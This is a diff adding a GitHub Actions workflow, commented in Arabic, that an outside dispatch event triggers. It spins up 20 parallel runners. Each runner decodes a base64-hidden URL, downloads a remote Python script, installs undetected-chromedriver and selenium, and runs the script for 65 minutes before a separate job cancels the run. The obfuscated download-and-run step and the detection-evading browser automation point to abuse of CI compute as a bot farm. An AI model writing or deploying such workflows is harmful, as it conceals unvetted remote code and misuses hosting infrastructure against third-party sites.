@@ -1,1 +1,108 @@
+name: Linux Unified Task Flotilla
 
+on:
+  # استقبال أمر التشغيل من الخارج عبر التوكن بالكلمة المفتاحية: start
+  repository_dispatch:
+    types: [start]
+
+concurrency:
+  group: unified-flotilla-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # منظّم الإنهاء الكامل: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  termination-director:
+    name: "Termination Director"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Release Full Termination Order
+        run: |
+          echo "[DIRECTOR] Termination director on station. Complete blackout scheduled at the 65-minute checkpoint."
+          echo "[DIRECTOR] Following workflow trace: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[DIRECTOR] Checkpoint reached! Releasing full termination order..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[DIRECTOR] Full termination order released. Every operating and queued unit will be dissolved."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الأسطول
+  # =================================================================
+  deploy-flotilla:
+    name: "FlotillaUnit-${{ matrix.unit_token }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_token: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      # ⟪المرحلة ١⟫ إرساء الأرضية التشغيلية
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      - name: Set Operational Groundwork
+        run: |
+          echo "[GROUNDWORK] Setting operational groundwork for FlotillaUnit-${{ matrix.unit_token }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      # ⟪المرحلة ٢⟫ استدعاء الحمولة التشغيلية
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      - name: Invoke Operational Payload
+        run: |
+          echo "[INVOKE] Invoking app_task.py from assigned delivery node..."
+          DELIVERY_NODE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$DELIVERY_NODE" -o app_task.py
+          echo "[INVOKE] Operational payload delivered."
+
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      # ⟪المرحلة ٣⟫ تجهيز المتطلبات التشغيلية
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      - name: Configure Execution Dependencies
+        run: |
+          echo "[CONFIGURE] Configuring execution dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      # ⟪المرحلة ٤⟫ التشغيل تحت إشراف دورة الحياة (65 دقيقة)
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      - name: Carry Out Bounded Operation
+        run: |
+          echo ">> Deploying FlotillaUnit-${{ matrix.unit_token }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          FLOTILLA_PID=$!
+          
+          echo ">> Operations supervisor engaged. Bound: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $FLOTILLA_PID 2>/dev/null; then
+            echo ">> Bound exceeded! Dissolving operation..."
+            kill -9 $FLOTILLA_PID
+            echo ">> Operation dissolved by supervisor."
+          else
+            echo ">> Operation wrapped up within the bound."
+          fi
